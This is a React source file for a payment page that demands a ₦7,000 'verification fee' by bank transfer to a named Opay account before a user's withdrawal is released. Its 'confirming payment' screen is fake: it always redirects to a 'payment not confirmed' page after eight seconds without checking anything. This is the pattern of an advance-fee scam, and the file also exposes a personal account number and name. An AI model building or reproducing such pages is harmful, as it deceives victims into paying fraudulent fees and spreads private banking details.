import { ArrowLeft } from "lucide-react";
import { Link, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { useState } from "react";

const TransferPage = () => {
  const navigate = useNavigate();
  const [isConfirming, setIsConfirming] = useState(false);

  const handleTransfer = () => {
    setIsConfirming(true);
    
    // Show confirming payment for 8 seconds
    setTimeout(() => {
      navigate('/payment-not-confirmed');
    }, 8000);
  };

  if (isConfirming) {
    return (
      <div className="min-h-screen bg-muted/30 p-3 max-w-md mx-auto flex items-center justify-center">
        <div className="bg-card rounded-2xl p-8 text-center space-y-6 w-full">
          {/* Loading Animation */}
          <div className="flex justify-center">
            <div className="w-24 h-24 relative">
              <div className="absolute inset-0 border-4 border-primary/30 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
            </div>
          </div>
          
          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-foreground">Confirming Payment</h2>
            <p className="text-muted-foreground">Please wait while we verify your transfer...</p>
          </div>

          <div className="flex justify-center space-x-1">
            <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '0s' }}></div>
            <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
            <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '0.4s' }}></div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-muted/30 p-3 max-w-md mx-auto">
      {/* Header */}
      <div className="flex items-center mb-6 pt-2">
        <Link to="/dashboard" className="mr-3">
          <ArrowLeft className="w-6 h-6 text-foreground" />
        </Link>
        <h1 className="text-lg font-semibold text-foreground">Complete Payment</h1>
      </div>

      <div className="space-y-4">
        {/* Amount Card */}
        <div className="bg-gradient-to-br from-primary/10 to-primary/5 rounded-2xl p-6 text-center border border-primary/20">
          <p className="text-sm text-muted-foreground mb-2">Transfer Amount</p>
          <p className="text-4xl font-bold text-primary mb-1">₦7,000</p>
          <p className="text-xs text-muted-foreground">Verification Fee</p>
        </div>

        {/* Bank Details Card */}
        <div className="bg-card rounded-2xl p-6 space-y-4">
          <div className="text-center mb-4">
            <h2 className="text-lg font-semibold text-foreground mb-1">Transfer to:</h2>
            <p className="text-sm text-muted-foreground">Complete this transfer to proceed</p>
          </div>

          <div className="space-y-3 bg-muted/30 rounded-xl p-4">
            <div className="flex justify-between items-center py-2 border-b border-border">
              <span className="text-sm text-muted-foreground">Bank:</span>
              <span className="font-semibold text-foreground">Opay</span>
            </div>

            <div className="flex justify-between items-center py-2 border-b border-border">
              <span className="text-sm text-muted-foreground">Account Number:</span>
              <span className="font-bold text-foreground">8102562883</span>
            </div>

            <div className="flex justify-between items-center py-2">
              <span className="text-sm text-muted-foreground">Account Name:</span>
              <span className="font-semibold text-foreground">Veronica Chisom Benjamin</span>
            </div>
          </div>

          {/* Important Notice */}
          <div className="bg-orange-50 dark:bg-orange-900/20 border border-orange-200 dark:border-orange-700 rounded-lg p-4 mt-4">
            <p className="text-sm text-orange-800 dark:text-orange-200 font-medium">
              ⚠️ Important: Transfer exactly ₦7,000 to the account above to verify your withdrawal request.
            </p>
          </div>
        </div>

        {/* Action Button */}
        <Button 
          onClick={handleTransfer}
          className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-4 rounded-full text-lg"
        >
          I Have Made Transfer
        </Button>

        <Link to="/dashboard">
          <Button 
            variant="outline"
            className="w-full border-2 border-muted-foreground/20 text-foreground font-semibold py-3 rounded-full"
          >
            Cancel
          </Button>
        </Link>
      </div>
    </div>
  );
};

export default TransferPage;
